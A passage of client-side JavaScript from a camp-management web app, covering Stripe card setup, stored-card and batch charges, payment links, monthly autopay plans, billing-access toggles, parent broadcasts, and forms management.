// forwards the client's current session automatically (same pattern the
// working send-sms/send-push callers already use elsewhere in this app).
async function callEdgeFunctionAuthed(fnName,body){
    var client=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():null;
    if(!client) throw new Error('Not signed in');
    var res=await client.functions.invoke(fnName,{body:body});
    if(res.error) throw new Error(res.error.message||'Edge function error');
    var data=res.data;
    if(data&&data.error) throw new Error(data.error);
    return data;
}

// Request a family to save their card
async function requestCardSetup(famKey){
    var f=families[famKey];if(!f)return;
    var email='';
    (f.households||[]).forEach(function(hh){(hh.parents||[]).forEach(function(p){if(p.email&&!email)email=p.email})});
    if(!email){toast('No parent email on file — add email in Families first','error');return}

    toast('Setting up card collection for '+f.name+'...');
    try{
        var result=await callEdgeFunction('stripe-setup',{
            familyName:f.name,
            email:email,
            campId:getCampId(),
            existingCustomerId:f.stripeCustomerId||null
        });
        // Store Stripe customer ID on family
        f.stripeCustomerId=result.customerId;
        f.stripeSetupSecret=result.clientSecret;
        save();

        // Open card collection UI
        openCardCollectionModal(famKey,result.clientSecret);
    }catch(err){
        console.error('[Me] Stripe setup error:',err);
        toast('Stripe error: '+err.message,'error');
    }
}

function openCardCollectionModal(famKey,clientSecret){
    var f=families[famKey];
    var pk=getStripePublishableKey();
    if(!pk){
        toast('Set your Stripe publishable key in Settings first','error');
        return;
    }

    var h='<div id="stripeCardSetup" style="min-height:200px">';
    h+='<p style="font-size:.85rem;color:var(--s600);margin-bottom:16px">Enter card details for <strong>'+esc(f.name)+'</strong>. The card will be saved securely with Stripe for future payments.</p>';
    h+='<div id="stripe-card-element" style="padding:12px;border:1px solid var(--s300);border-radius:var(--r);background:#fff;min-height:44px"></div>';
    h+='<div id="stripe-card-errors" style="color:var(--err);font-size:.8rem;margin-top:8px"></div>';
    h+='<div style="margin-top:16px;display:flex;justify-content:flex-end;gap:8px">';
    h+='<button class="me-btn me-btn--sec" onclick="CampistryMe.closeModal(\'dynModal\')">Cancel</button>';
    h+='<button class="me-btn me-btn--pri" id="stripeSubmitBtn" disabled>Save Card</button>';
    h+='</div></div>';

    showModal('Save Payment Method',h);

    // Load Stripe.js if not already loaded
    if(!window.Stripe){
        var script=document.createElement('script');
        script.src='https://js.stripe.com/v3/';
        script.onload=function(){initStripeElements(pk,clientSecret,famKey)};
        document.head.appendChild(script);
    }else{
        setTimeout(function(){initStripeElements(pk,clientSecret,famKey)},100);
    }
}

function initStripeElements(pk,clientSecret,famKey){
    var stripe=window.Stripe(pk);
    var elements=stripe.elements();
    var cardElement=elements.create('card',{
        style:{base:{fontSize:'16px',fontFamily:'DM Sans, sans-serif',color:'#1e293b','::placeholder':{color:'#94a3b8'}}}
    });
    var mountEl=document.getElementById('stripe-card-element');
    if(!mountEl)return;
    cardElement.mount('#stripe-card-element');

    var submitBtn=document.getElementById('stripeSubmitBtn');
    var errEl=document.getElementById('stripe-card-errors');

    cardElement.on('change',function(ev){
        if(ev.error) errEl.textContent=ev.error.message;
        else errEl.textContent='';
        submitBtn.disabled=!ev.complete;
    });

    submitBtn.onclick=async function(){
        submitBtn.disabled=true;
        submitBtn.textContent='Saving...';
        var result=await stripe.confirmCardSetup(clientSecret,{payment_method:{card:cardElement}});
        if(result.error){
            errEl.textContent=result.error.message;
            submitBtn.disabled=false;
            submitBtn.textContent='Save Card';
        }else{
            // Card saved successfully
            var f=families[famKey];
            if(f){
                f.stripePaymentMethodId=result.setupIntent.payment_method;
                f.cardOnFile=true;
                f.cardSavedDate=new Date().toISOString();
            }
            save();
            closeModal('dynModal');
            renderBilling();
            toast('Card saved for '+f.name+'!');
        }
    };
}

// Charge a family's stored card
async function chargeStoredCard(famKey,amount,description){
    var f=families[famKey];
    if(!f||!f.stripeCustomerId){toast('No card on file — save a card first','error');return}

    if(!amount){
        // Ask for amount
        var ledgers=buildFamilyLedgers();
        var balance=ledgers[famKey]?.balance||0;
        var h='<div class="me-modal-form">';
        h+='<p style="font-size:.85rem;color:var(--s600);margin-bottom:12px">Charge the card on file for <strong>'+esc(f.name)+'</strong></p>';
        h+='<div style="background:var(--s50);padding:10px 14px;border-radius:var(--r);margin-bottom:14px;font-size:.85rem">Balance due: <strong style="color:var(--err)">'+fm(balance)+'</strong>'+(f.cardOnFile?' · Card on file ✓':'')+'</div>';
        h+='<div class="me-field"><label>Amount to Charge ($)</label><input type="number" id="chargeAmt" class="me-input" value="'+balance.toFixed(2)+'" step="0.01" min="0.50"></div>';
        h+='<div class="me-field"><label>Description</label><input type="text" id="chargeDesc" class="me-input" value="Campistry payment — '+esc(f.name)+'" placeholder="Payment description"></div>';
        h+='</div>';
        showModal('Charge Card',h,function(){
            var amt=parseFloat(document.getElementById('chargeAmt').value)||0;
            var desc=document.getElementById('chargeDesc').value.trim();
            if(amt<0.50){toast('Minimum charge is $0.50','error');return}
            closeModal('dynModal');
            chargeStoredCard(famKey,amt,desc);
        });
        return;
    }

    toast('Charging '+fm(amount)+' to '+f.name+'...');
    try{
        var result=await callEdgeFunctionAuthed('stripe-charge',{
            customerId:f.stripeCustomerId,
            paymentMethodId:f.stripePaymentMethodId||null,
            amount:amount,
            currency:'usd',
            description:description||'Campistry payment',
            metadata:{campId:getCampId(),familyName:f.name,familyKey:famKey}
        });

        if(result.status==='requires_action'){
            toast('Card requires authentication — parent must approve','error');
            return;
        }

        if(result.status==='succeeded'){
            // Record payment locally
            finPayments.push({
                id:'pay_'+Date.now(),
                family:f.name,
                familyKey:famKey,
                amount:amount,
                date:new Date().toISOString().split('T')[0],
                method:'Stripe (auto)',
                reference:result.paymentIntentId,
                notes:'Auto-charged via Stripe',
                stripePaymentIntentId:result.paymentIntentId,
                timestamp:Date.now()
            });
            f.totalPaid=(f.totalPaid||0)+amount;
            f.balance=Math.max(0,(f.balance||0)-amount);
            save();renderBilling();
            toast('Charged '+fm(amount)+' to '+f.name+' — payment succeeded!');
        }else{
            toast('Payment status: '+result.status,'error');
        }
    }catch(err){
        console.error('[Me] Stripe charge error:',err);
        toast('Charge failed: '+err.message,'error');
    }
}

// Batch charge all families with outstanding balance
async function batchCharge(){
    var ledgers=buildFamilyLedgers();
    var eligible=Object.entries(ledgers).filter(function([fk,l]){
        return l.balance>0&&families[fk]?.stripeCustomerId&&families[fk]?.cardOnFile;
    });
    if(!eligible.length){toast('No families with card on file and outstanding balance','error');return}

    var total=eligible.reduce(function(s,[,l]){return s+l.balance},0);
    var h='<div>';
    h+='<p style="font-size:.85rem;color:var(--s600);margin-bottom:14px">This will charge <strong>'+eligible.length+' families</strong> for a total of <strong>'+fm(total)+'</strong> using their saved cards.</p>';
    h+='<div style="max-height:250px;overflow-y:auto;border:1px solid var(--s200);border-radius:var(--r);margin-bottom:14px">';
    eligible.forEach(function([fk,l]){
        h+='<div style="display:flex;justify-content:space-between;padding:8px 12px;border-bottom:1px solid var(--s100);font-size:.8rem"><span class="bold">'+esc(l.family.name)+'</span><span style="font-weight:700;color:var(--err)">'+fm(l.balance)+'</span></div>';
    });
    h+='</div>';
    h+='<p style="font-size:.75rem;color:var(--warn);font-weight:600">⚠ This action will charge real credit cards. Proceed with caution.</p>';
    h+='</div>';

    showModal('Batch Charge — '+eligible.length+' Families',h,async function(){
        closeModal('dynModal');
        toast('Processing batch charges...');
        var success=0,failed=0;
        for(var[fk,l]of eligible){
            try{
                await chargeStoredCard(fk,l.balance,'Batch payment — '+families[fk].name);
                success++;
            }catch(e){
                console.error('[Me] Batch charge failed for',fk,e);
                failed++;
            }
            // Small delay between charges to avoid rate limits
            await new Promise(function(r){setTimeout(r,500)});
        }
        toast('Batch complete: '+success+' charged, '+failed+' failed');
        renderBilling();
    });
}

// ═══════════════════════════════════════════════════════════════
// ONLINE PAYMENT LINK — a hosted Stripe Checkout the parent pays on.
// Offers every method the camp enabled in Stripe (card, ACH bank debit,
// Cash App, PayPal, Link, …). The payment records itself into the ledger
// via stripe-webhook — no manual entry. (Venmo/Zelle can't be processed
// by Stripe; those stay manual-entry methods.)
// ═══════════════════════════════════════════════════════════════
async function sendPayLink(famKey){
    var f=families[famKey]; if(!f){toast('Family not found','error');return}
    var bal=buildFamilyLedgers()[famKey]?.balance||0;
    var email='';(f.households||[]).forEach(function(hh){(hh.parents||[]).forEach(function(p){if(p.email&&!email)email=p.email})});
    var h='<div class="me-modal-form">';
    h+='<p style="font-size:.85rem;color:var(--s600);margin-bottom:10px">Create a secure online payment link for <strong>'+esc(f.name)+'</strong>. Send it to the parent — they can pay by card, bank transfer (ACH), Cash App, PayPal or any other method you\'ve enabled in Stripe, and it records itself here automatically.</p>';
    h+='<div style="background:var(--s50);padding:10px 14px;border-radius:var(--r);margin-bottom:14px;font-size:.85rem">Balance due: <strong style="color:var(--err)">'+fm(bal)+'</strong>'+(email?' · '+esc(email):' · <span style="color:var(--err)">no parent email on file</span>')+'</div>';
    h+='<div class="me-field"><label>Amount ($)</label><input type="number" id="plAmt" class="me-input" value="'+(bal>0?bal.toFixed(2):'')+'" step="0.01" min="0.50"></div>';
    h+='<div class="me-field"><label>What\'s this for?</label><input type="text" id="plDesc" class="me-input" value="Camp tuition — '+esc(f.name)+'"></div>';
    h+='</div>';
    showModal('Online Payment Link',h,async function(){
        var amt=parseFloat(document.getElementById('plAmt').value)||0;
        if(amt<0.50){toast('Enter an amount of at least $0.50','error');return}
        var desc=document.getElementById('plDesc').value.trim();
        var btn=document.getElementById('dynModalSave'); if(btn){btn.disabled=true;btn.textContent='Creating…';}
        try{
            var res=await callEdgeFunction('stripe-checkout',{campId:getCampId(),familyKey:famKey,familyName:f.name,email:email,amount:amt,description:desc});
            if(!res.url) throw new Error('No link returned');
            _showPayLinkResult(f,res.url);
        }catch(err){
            console.error('[Me] pay link error:',err);
            toast('Could not create link: '+err.message,'error');
            if(btn){btn.disabled=false;btn.textContent='Save';}
        }
    });
}
function _showPayLinkResult(f,url){
    var h='<div class="me-modal-form">';
    h+='<p style="font-size:.85rem;color:var(--s600);margin-bottom:10px">Payment link for <strong>'+esc(f.name)+'</strong> is ready. Copy it into a text or email — it opens a secure Stripe checkout with every payment method you offer, and the payment lands in Billing automatically.</p>';
    h+='<div class="me-field"><label>Payment link</label><input type="text" id="plUrl" class="me-input" readonly value="'+esc(url)+'" onclick="this.select()"></div>';
    h+='<div style="display:flex;gap:8px;margin-top:6px">';
    h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.copyPayLink()">Copy link</button>';
    h+='<a class="me-btn me-btn--sec me-btn--sm" href="'+esc(url)+'" target="_blank" rel="noopener">Open</a>';
    h+='</div></div>';
    showModal('Send this link to the parent',h);
}
function copyPayLink(){var el=document.getElementById('plUrl');if(!el)return;el.select();try{navigator.clipboard&&navigator.clipboard.writeText(el.value)}catch(e){try{document.execCommand('copy')}catch(_){}}toast('Link copied')}

// Billing access (migration 070) is independent of a parent's portal/roster
// status — removing a camper from the roster closes messaging/forms for that
// family but was ALSO silently wiping their balance/payment history, which
// broke families still mid-payment-plan after the season ended. Billing
// access defaults to open and stays open forever unless staff explicitly
// close it here — this is the only place it's ever turned off.
async function toggleBillingAccess(famKey){
    var f=families[famKey]; if(!f){toast('Family not found','error');return}
    var email='';(f.households||[]).forEach(function(hh){(hh.parents||[]).forEach(function(p){if(p.email&&!email)email=p.email})});
    if(!email){toast('No parent email on file for this family','error');return}
    var closing=!f.billingAccessClosed;
    var bal=buildFamilyLedgers()[famKey]?.balance||0;
    var msg=closing
        ?('This stops <strong>'+esc(f.name)+'</strong> from seeing or paying their balance in the parent portal.'+(bal>0.005?' They still owe <strong>'+fm(bal)+'</strong>.':'')+' You can reopen it anytime.')
        :('This restores <strong>'+esc(f.name)+'</strong>\'s access to their balance and payment history in the parent portal.');
    var ok=await confirmDialog({title:closing?'Close billing access?':'Reopen billing access?',message:msg,confirmLabel:closing?'Close access':'Reopen access',danger:closing&&bal>0.005});
    if(!ok)return;
    var client=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():null;
    var campId=window.CampistryDB&&window.CampistryDB.getCampId?window.CampistryDB.getCampId():null;
    if(!client||!campId){toast('Cloud not connected','error');return}
    client.rpc('set_parent_billing_access',{p_camp_id:campId,p_parent_email:email,p_enabled:!closing}).then(function(res){
        var d=res&&res.data;
        if(!d||!d.success){toast('Could not update billing access','error');return}
        if(!d.updated){toast('No parent portal invite found for this family','error');return}
        f.billingAccessClosed=closing;
        save();
        toast(closing?'Billing access closed':'Billing access reopened');
        render(curPage);
    }).catch(function(){toast('Could not update billing access','error')});
}

// ═══════════════════════════════════════════════════════════════
// MONTHLY BILLING (AUTOPAY) — split a balance into monthly payments and
// auto-charge the saved card on each due date. The schedule lives on the
// family (f.plan); a scheduled edge function (charge-due-installments) runs
// daily and charges whatever is due for families with autopay + a card on
// file, recording each payment into the ledger.
// ═══════════════════════════════════════════════════════════════
function monthlyPlan(famKey){
    var f=families[famKey]; if(!f){toast('Family not found','error');return}
    var bal=buildFamilyLedgers()[famKey]?.balance||0;
    var hasCard=!!f.cardOnFile;
    var existing=f.plan&&f.plan.installments&&f.plan.installments.length;
    var d=new Date(); var defStart=new Date(d.getFullYear(),d.getMonth()+1,1).toISOString().split('T')[0];
    var h='<div class="me-modal-form">';
    if(existing) h+='<div style="background:#FFFBEB;border:1px solid #FDE68A;padding:9px 12px;border-radius:var(--r);margin-bottom:12px;font-size:.8rem;color:#92400E">This family already has a monthly plan ('+f.plan.installments.length+' payments). Saving replaces it.</div>';
    h+='<div style="background:var(--s50);padding:10px 14px;border-radius:var(--r);margin-bottom:14px;font-size:.85rem">Balance to schedule: <strong style="color:var(--err)">'+fm(bal)+'</strong>'+(hasCard?' · <span style="color:var(--ok)">card on file ✓</span>':'')+'</div>';
    h+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">';
    h+='<div class="me-field"><label>Total to schedule ($)</label><input type="number" id="mpTotal" class="me-input" value="'+(bal>0?bal.toFixed(2):'')+'" step="0.01" min="0.50"></div>';
    h+='<div class="me-field"><label># Monthly payments</label><input type="number" id="mpMonths" class="me-input" value="3" min="1" max="24"></div>';
    h+='</div>';
    h+='<div class="me-field"><label>First payment date</label><input type="date" id="mpStart" class="me-input" value="'+defStart+'"></div>';
    if(hasCard) h+='<label style="display:flex;align-items:center;gap:8px;font-size:.85rem;margin-top:4px"><input type="checkbox" id="mpAuto" checked> Auto-charge the card on file on each due date</label>';
    else h+='<div style="font-size:.75rem;color:var(--me);margin-top:6px">No card on file — save a card to enable auto-charge. You can still create the schedule; the parent can pay each month from their portal.</div>';
    h+='</div>';
    showModal(existing?'Edit Monthly Plan':'Set Up Monthly Plan',h,function(){
        var total=parseFloat(document.getElementById('mpTotal').value)||0;
        var months=parseInt(document.getElementById('mpMonths').value,10)||1;
        if(total<0.5){toast('Enter a total of at least $0.50','error');return}
        if(months<1)months=1; if(months>24)months=24;
        var start=document.getElementById('mpStart').value||defStart;
        var auto=hasCard&&document.getElementById('mpAuto')&&document.getElementById('mpAuto').checked;
        var each=Math.round(total/months*100)/100;
        var insts=[]; var sd=new Date(start+'T12:00:00');
        for(var i=0;i<months;i++){
            var due=new Date(sd.getFullYear(),sd.getMonth()+i,sd.getDate());
            var amt=(i===months-1)?Math.round((total-each*(months-1))*100)/100:each;
            insts.push({n:i+1,amount:amt,dueDate:due.toISOString().split('T')[0],status:'pending',paymentId:null});
        }
        f.plan={installments:insts,autopay:!!auto,total:total,createdAt:new Date().toISOString()};
        save();closeModal('dynModal');renderBilling();
        toast('Monthly plan created — '+months+' payment'+(months>1?'s':'')+(auto?', autopay on':''));
    });
}
function toggleFamilyAutopay(famKey){
    var f=families[famKey]; if(!f||!f.plan)return;
    if(!f.cardOnFile&&!f.plan.autopay){toast('Save a card on file first','error');return}
    f.plan.autopay=!f.plan.autopay; save();renderBilling();
    toast('Autopay '+(f.plan.autopay?'ON':'off')+' for '+f.name);
}
async function cancelMonthlyPlan(famKey){
    var f=families[famKey]; if(!f||!f.plan)return;
    var ok=await confirmDialog({title:'Cancel Monthly Plan?',message:'Cancel the monthly plan for '+f.name+'? Payments already made stay on the ledger.',confirmLabel:'Cancel Plan',danger:true});
    if(!ok)return;
    delete f.plan; save();renderBilling();toast('Monthly plan cancelled');
}
function _planCardHtml(l){
    var f=families[l.famKey]; if(!f||!f.plan||!f.plan.installments||!f.plan.installments.length) return '';
    var today=new Date().toISOString().split('T')[0];
    var pend=f.plan.installments.filter(function(i){return i.status!=='paid'}).sort(function(a,b){return(a.dueDate||'').localeCompare(b.dueDate||'')});
    var next=pend[0];
    var chips=f.plan.installments.map(function(i){
        var overdue=i.status!=='paid'&&i.dueDate&&i.dueDate<today;
        var bg=i.status==='paid'?'background:#ECFDF5;border-color:#A7F3D0;color:#0E7C4A':i.status==='failed'?'background:#FEF2F2;border-color:#FECACA;color:#DC2626':overdue?'background:#FEF2F2;border-color:#FECACA;color:#DC2626':'background:var(--s50);border-color:var(--s200);color:var(--s600)';
        var lbl=i.status==='paid'?'✓ ':(i.status==='failed'?'⚠ ':(overdue?'⚠ ':''));
        return '<span style="display:inline-block;padding:3px 10px;border-radius:999px;font-size:.72rem;font-weight:600;margin:2px;border:1px solid;'+bg+'">'+lbl+fm(i.amount)+' · '+esc(i.dueDate||'TBD')+'</span>';
    }).join('');
    var autoBadge=f.plan.autopay?'<span style="color:var(--ok);font-weight:700">● Autopay ON</span>':'<span style="color:var(--s400);font-weight:700">○ Autopay off</span>';
    return '<div style="padding:12px 16px;border-top:1px solid var(--s100);background:#FFFEFB">'+
        '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><div style="font-size:.75rem;font-weight:700;color:var(--s500);text-transform:uppercase;letter-spacing:.04em">📆 Monthly Plan</div><div style="font-size:.75rem">'+autoBadge+'</div></div>'+
        '<div style="margin-bottom:6px">'+chips+'</div>'+
        (next?'<div style="font-size:.73rem;color:var(--s500)">Next: <strong>'+fm(next.amount)+'</strong> due '+esc(next.dueDate)+(f.plan.autopay&&f.cardOnFile?' — auto-charges the card on file':(f.plan.autopay?' — autopay on, but no card on file':''))+'</div>':'<div style="font-size:.73rem;color:var(--ok);font-weight:600">All installments paid ✓</div>')+
        '<div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap">'+
        '<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.toggleFamilyAutopay(\''+je(l.famKey)+'\')">'+(f.plan.autopay?'Turn autopay off':'Turn autopay on')+'</button>'+
        '<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.monthlyPlan(\''+je(l.famKey)+'\')">Edit plan</button>'+
        '<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe.cancelMonthlyPlan(\''+je(l.famKey)+'\')">Cancel plan</button>'+
        '</div></div>';
}

// ═══════════════════════════════════════════════════════════════
// BROADCASTS — Full messaging system
// ═══════════════════════════════════════════════════════════════
function renderBroadcasts(){
    var c=document.getElementById('page-broadcasts');
    var h='<div class="sec-hd"><div><h2 class="sec-title">Broadcasts & Messaging</h2><p class="sec-desc">'+broadcasts.length+' message'+(broadcasts.length!==1?'s':'')+' sent</p></div><div class="sec-actions"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.sendPaymentReminders()">💰 Payment Reminders</button><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.sendFormReminders()">📋 Form Reminders</button><button class="me-btn me-btn--pri" onclick="CampistryMe.openBroadcastModal()">+ New Broadcast</button></div></div>';

    // Quick stats
    var thisWeek=broadcasts.filter(function(b){return b.timestamp&&Date.now()-b.timestamp<7*86400000}).length;
    h+='<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:18px">';
    h+='<div style="flex:1;min-width:140px;background:#fff;border-radius:var(--r2);padding:14px 16px;border:1px solid var(--s200)"><div style="font-size:1.25rem;font-weight:800">'+broadcasts.length+'</div><div style="font-size:.7rem;color:var(--s400);font-weight:600;text-transform:uppercase">Total Sent</div></div>';
    h+='<div style="flex:1;min-width:140px;background:#fff;border-radius:var(--r2);padding:14px 16px;border:1px solid var(--s200)"><div style="font-size:1.25rem;font-weight:800">'+thisWeek+'</div><div style="font-size:.7rem;color:var(--s400);font-weight:600;text-transform:uppercase">This Week</div></div>';
    h+='</div>';

    if(broadcasts.length){
        var sorted=[...broadcasts].sort(function(a,b){return(b.timestamp||0)-(a.timestamp||0)});
        h+='<div class="me-card"><div class="me-card-head"><h3>Message History</h3></div><div class="me-tw"><table class="me-t"><thead><tr><th>Date</th><th>Subject</th><th>To</th><th>Method</th><th>Recipients</th><th></th></tr></thead><tbody>';
        sorted.forEach(function(b,i){
            var d=b.timestamp?new Date(b.timestamp).toLocaleDateString():(b.date||'');
            h+='<tr><td>'+esc(d)+'</td><td class="bold">'+esc(b.subject||'(no subject)')+'</td><td>'+esc(b.to||'All')+'</td><td>'+bdg(b.method||'In-App','ok')+'</td><td style="font-weight:600">'+(b.recipientCount||'—')+'</td><td><button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.viewBroadcast('+i+')">View</button><button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe.removeBroadcast('+i+')">×</button></td></tr>';
        });
        h+='</tbody></table></div></div>';
    } else {
        h+='<div class="me-empty"><h3>No broadcasts sent yet</h3><p>Send a message to parents, staff, or specific divisions.</p><button class="me-btn me-btn--pri" onclick="CampistryMe.openBroadcastModal()">+ Send First Broadcast</button></div>';
    }
    c.innerHTML=h;
}

function openBroadcastModal(){
    var divOpts=Object.keys(structure).map(function(d){return'<option value="'+esc(d)+'">'+esc(d)+'</option>'}).join('');
    var h='<div class="me-modal-form"><div class="me-field"><label>To</label><select id="bcTo" class="me-input" onchange="document.getElementById(\'bcDivWrap\').style.display=this.value===\'division\'?\'block\':\'none\'"><option value="all">All Families</option><option value="division">Specific Division</option><option value="enrolled">Enrolled Families Only</option><option value="staff">Staff Only</option></select></div>';
    h+='<div id="bcDivWrap" style="display:none"><div class="me-field"><label>Division</label><select id="bcDiv" class="me-input">'+divOpts+'</select></div></div>';
    h+='<div class="me-field"><label>Method</label><select id="bcMethod" class="me-input"><option value="In-App">In-App (Parent Portal)</option><option value="Email">Email</option><option value="SMS">SMS</option><option value="All Channels">All Channels</option></select></div>';
    h+='<div class="me-field"><label>Subject</label><input type="text" id="bcSubject" class="me-input" placeholder="Message subject..."></div>';
    h+='<div class="me-field"><label>Message</label><textarea id="bcBody" class="me-input" rows="6" placeholder="Type your message here..." style="resize:vertical"></textarea></div></div>';
    showModal('New Broadcast',h,async function(){
        var to=document.getElementById('bcTo').value;
        var div=document.getElementById('bcDiv')?.value||'';
        var method=document.getElementById('bcMethod').value;
        var subject=document.getElementById('bcSubject').value.trim();
        var body=document.getElementById('bcBody').value.trim();
        if(!subject&&!body){toast('Enter a subject or message','error');return}
        // Count recipients
        var count=0;
        if(to==='all') count=Object.keys(families).length||Object.keys(roster).length;
        else if(to==='division') count=Object.values(roster).filter(function(c){return c.division===div}).length;
        else if(to==='enrolled') count=Object.values(enrollments).filter(function(e){return e.status==='enrolled'}).length;
        else if(to==='staff') count=finStaff.length;
        var label=to==='division'?div:to==='enrolled'?'Enrolled':to==='staff'?'Staff':'All Families';
        var rec={subject:subject,body:body,to:label,method:method,recipientCount:count,timestamp:Date.now(),date:new Date().toISOString().split('T')[0]};
        // ★ Email/SMS/All-Channels actually DELIVER via the edge function. Previously the
        //   modal only LOGGED the broadcast yet toasted "sent" — so e-mail/SMS reached no one.
        //   Now: confirm before a real send (safety gate), then deliver; In-App is a portal record.
        var realSend=/email|sms|all channels/i.test(method);
        if(realSend){
            var okSend=await confirmDialog({title:'Send Broadcast?',message:'Send this '+method+' broadcast to '+label+' (~'+count+' recipient'+(count!==1?'s':'')+') now? This delivers to real parents/staff immediately.',confirmLabel:'Send',danger:false});
            if(!okSend)return;
        }
        broadcasts.push(rec);
        save();closeModal();renderBroadcasts();
        if(realSend){
            toast('Sending broadcast…');
            sendBroadcastNow(rec).then(function(res){res=res||{};toast('Broadcast sent ('+(res.sent||0)+' delivered'+(res.failed?', '+res.failed+' failed':'')+')')}).catch(function(){toast('Broadcast logged, but delivery failed','error')});
        }else{
            toast('Broadcast posted to the parent portal ('+count+' recipient'+(count!==1?'s':'')+')');
        }
    });
}
function viewBroadcast(idx){
    var sorted=[...broadcasts].sort(function(a,b){return(b.timestamp||0)-(a.timestamp||0)});
    var b=sorted[idx];if(!b)return;
    var d=b.timestamp?new Date(b.timestamp).toLocaleString():(b.date||'');
    var h='<div style="margin-bottom:12px"><div style="font-size:.7rem;color:var(--s400);text-transform:uppercase;font-weight:600">Sent</div><div>'+esc(d)+'</div></div>';
    h+='<div style="margin-bottom:12px"><div style="font-size:.7rem;color:var(--s400);text-transform:uppercase;font-weight:600">To</div><div>'+esc(b.to||'All')+' · '+esc(b.method||'In-App')+' · '+(b.recipientCount||'?')+' recipients</div></div>';
    h+='<div style="margin-bottom:12px"><div style="font-size:.7rem;color:var(--s400);text-transform:uppercase;font-weight:600">Subject</div><div style="font-weight:600;font-size:1rem">'+esc(b.subject||'')+'</div></div>';
    h+='<div style="background:var(--s50);padding:14px;border-radius:var(--r);font-size:.85rem;line-height:1.6;white-space:pre-wrap">'+esc(b.body||'(no body)')+'</div>';
    showModal('Broadcast',h);
}
async function removeBroadcast(idx){
    var sorted=[...broadcasts].sort(function(a,b){return(b.timestamp||0)-(a.timestamp||0)});
    var ok=await confirmDialog({title:'Delete Broadcast?',message:'Delete this broadcast? This only removes the log entry, not messages already delivered.',confirmLabel:'Delete',danger:true});
    if(!ok)return;
    var orig=broadcasts.indexOf(sorted[idx]);
    var captured=orig>=0?broadcasts[orig]:null;
    if(orig>=0) broadcasts.splice(orig,1);
    save();renderBroadcasts();
    toast('Broadcast removed','ok',{actionLabel:'Undo',onAction:function(){
        if(captured){broadcasts.splice(orig,0,captured)}
        save();renderBroadcasts();toast('Broadcast restored');
    }});
}

// ═══════════════════════════════════════════════════════════════
// FORMS & DOCS — Digital form management
// ═══════════════════════════════════════════════════════════════
var campForms=[];
function loadForms(){var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campForms=(s.campistryMe&&s.campistryMe.forms)||[]}

// ─── Link Forms (parent-portal forms/docs managed by admin) ───────────────────
var linkForms={digital:[],printReturn:[],documents:[]};
function loadLinkForms(){
    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
    var lf=s.link_forms||{};
    linkForms={digital:lf.digital||[],printReturn:lf.printReturn||[],documents:lf.documents||[]};
}
function saveLinkForms(){
    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
    s.link_forms=linkForms;
    localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function')
        window.saveGlobalSettings('link_forms',linkForms);
}
function saveForms(){
    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
    if(!s.campistryMe)s.campistryMe={};
    s.campistryMe.forms=campForms;
    localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
    // Route through saveGlobalSettings so the value reaches IDB + cloud.
    // Writing localStorage alone left forms cloud-orphaned.
    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function')
        window.saveGlobalSettings('campistryMe',s.campistryMe);
}

function renderForms(){
    loadForms();
    loadLinkForms();
    var c=document.getElementById('page-forms');
    var h='<div class="sec-hd"><div><h2 class="sec-title">Forms &amp; Documents</h2></div></div>';
    // Tabs
    h+='<div style="display:flex;gap:0;border-bottom:2px solid var(--s100);margin-bottom:20px;">';
    h+='<button id="fTab-camp" onclick="CampistryMe.switchFormsTab(\'camp\')" style="padding:9px 20px;background:none;border:none;border-bottom:2px solid var(--me);margin-bottom:-2px;font-weight:700;font-size:.85rem;color:var(--me);cursor:pointer;">Camp Forms</button>';
    h+='<button id="fTab-link" onclick="CampistryMe.switchFormsTab(\'link\')" style="padding:9px 20px;background:none;border:none;border-bottom:2px solid transparent;margin-bottom:-2px;font-weight:600;font-size:.85rem;color:var(--s400);cursor:pointer;">Link Forms</button>';
    h+='</div>';
    h+='<div id="formsView-camp">'+_campFormsHTML()+'</div>';
    h+='<div id="formsView-link" style="display:none;">'+_linkFormsHTML()+'</div>';
    c.innerHTML=h;
}

function switchFormsTab(tab){
    var camp=document.getElementById('formsView-camp');
    var link=document.getElementById('formsView-link');
    var tCamp=document.getElementById('fTab-camp');
    var tLink=document.getElementById('fTab-link');
    if(tab==='camp'){
        camp.style.display='';link.style.display='none';
        tCamp.style.cssText=tCamp.style.cssText.replace('transparent','var(--me)').replace('var(--s400)','var(--me)');tCamp.style.fontWeight='700';
        tLink.style.cssText=tLink.style.cssText.replace('var(--me)','transparent');tLink.style.color='var(--s400)';tLink.style.fontWeight='600';
    } else {
        camp.style.display='none';link.style.display='';
        tLink.style.cssText=tLink.style.cssText.replace('transparent','var(--me)').replace('var(--s400)','var(--me)');tLink.style.fontWeight='700';
        tCamp.style.cssText=tCamp.style.cssText.replace('var(--me)','transparent');tCamp.style.color='var(--s400)';tCamp.style.fontWeight='600';
    }
}

function _campFormsHTML(){
    var completedCount=0,pendingCount=0;
    campForms.forEach(function(f){
        var completed=(f.responses||[]).length;
        var total=Object.keys(roster).length;
        completedCount+=completed;pendingCount+=(total-completed);
    });
    var h='<div class="sec-actions" style="margin-bottom:14px;"><button class="me-btn me-btn--pri" onclick="CampistryMe.addForm()">+ Create Form</button></div>';
    h+='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px;margin-bottom:18px">';
